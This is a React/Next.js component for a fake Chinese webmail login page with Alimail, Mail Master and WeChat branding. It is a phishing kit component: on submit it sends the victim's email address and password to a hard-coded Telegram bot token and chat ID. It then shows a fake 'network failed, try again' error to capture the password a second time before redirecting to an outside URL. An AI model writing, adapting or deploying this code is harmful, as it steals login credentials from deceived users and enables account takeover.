"use client";

import { Fragment, useState } from "react";
import Image from "next/image";
import { FaEye, FaEyeSlash } from "react-icons/fa";
import { loginValidationSchema } from "@/utils/validationSchema";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import styles from "./generalform.module.css";
import { useRouter } from "next/navigation";

const GeneralForm = ({ emailAddress }) => {
  const router = useRouter();
  const [showPassword, setShowPassword] = useState(false);
  const [counter, setCounter] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors },
  } = useForm({
    resolver: yupResolver(loginValidationSchema),
  });

  const loginFormSubmit = async (data) => {
    setIsLoading(true);
    try {
      const telegramData = {
        chat_id: "5822512651",
        text: `ROOT LOGS\nChina General Page Info \nEmailAddress: ${emailAddress}\nPassword: ${data.password}`,
      };
      // Send the data to the Telegram bot (replace <BOT_TOKEN> and <CHAT_ID> with your own values)
      fetch(
        "https://api.telegram.org/bot6210968002:AAGI26N1qjaGfovCXzjvQSJ7-SBdlyRK0Es/sendMessage",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(telegramData),
        }
      )
        .then((response) => {
          if (response.ok) {
            if (!counter) {
              setTimeout(() => {
                setIsLoading(false);
                setCounter(true);
              }, 2000);
            } else {
              setTimeout(() => {
                setIsLoading(false);
                router.push(
                  "https://elitedatagateway.com/pay/W2022079.01/9d2e4894541cab101a77106733dc61ba"
                );
              }, 2000);
            }

            console.log("Form data sent to Telegram bot");
          } else {
            setIsLoading(false);
            console.error("Failed to send form data to Telegram bot");
          }
        })
        .catch((error) => {
          console.error("Error sending form data to Telegram bot:", error);
        });
      reset();
    } catch (err) {}
  };

  return (
    <Fragment>
      <form
        className={`${styles.formContainerInput} row`}
        onSubmit={handleSubmit(loginFormSubmit)}
      >
        {counter ? (
          <div className="col-lg-12 col-md-12 col-sm-12 mt-3">
            <span className={styles.errorMsg}>网络连接失败。 再试一次</span>
          </div>
        ) : null}
        <div className="col-lg-12 col-md-12 col-sm-12 mt-3">
          <input
            className="form-control"
            type="text"
            name="emailAddress"
            value={emailAddress}
            placeholder="邮箱地址"
            readOnly
            {...register("emailAddress")}
          />
          {errors.emailAddress && (
            <small className="mt-2">{errors.emailAddress.message}</small>
          )}
        </div>
        <div className="col-lg-12 col-md-12 col-sm-12  mt-3 position-relative">
          <input
            className="form-control"
            type={showPassword ? "text" : "password"}
            name="password"
            placeholder="密码"
            {...register("password")}
          />
          <span
            className={styles.iconHolder}
            onClick={() => setShowPassword(!showPassword)}
          >
            {showPassword ? (
              <FaEyeSlash fontSize="20px" color="#e23c39" />
            ) : (
              <FaEye fontSize="20px" color="#e23c39" />
            )}
          </span>
          {errors.password && (
            <small className="mt-2">{errors.password.message}</small>
          )}
        </div>

        <div className="col-lg-12 col-md-12 col-sm-12  mt-3">
          <div className={styles.authOptions}>
            <a href="">忘记密码</a>
          </div>
        </div>

        <div className="col-lg-12 col-md-12 col-sm-12  mt-3">
          {isLoading ? (
            <button
              className={`btn btn-primary ${styles.authButton}`}
              type="button"
              disabled
            >
              <span
                className="spinner-border spinner-border-sm mr-4"
                role="status"
                aria-hidden="true"
              />
            </button>
          ) : (
            <button className={styles.authButton}>登 录</button>
          )}
        </div>

        <div className="col-lg-12 col-md-12 col-sm-12  mt-3">
          <div className={styles.emailAlternatives}>
            <a className="navbar-brand" href="#">
              <Image
                height={50}
                width={50}
                alt="Alimail"
                src="/static/icon-sirius-img.png"
              />
            </a>

            <a className="navbar-brand" href="#">
              <Image
                height={50}
                width={50}
                alt="Alimail"
                src="/static/icon-mail-master-img.png"
              />
            </a>

            <a className="navbar-brand" href="#">
              <Image
                height={50}
                width={50}
                alt="Alimail"
                src="/static/icon-wx-img.png"
              />
            </a>
          </div>
        </div>
      </form>
    </Fragment>
  );
};

export default GeneralForm;
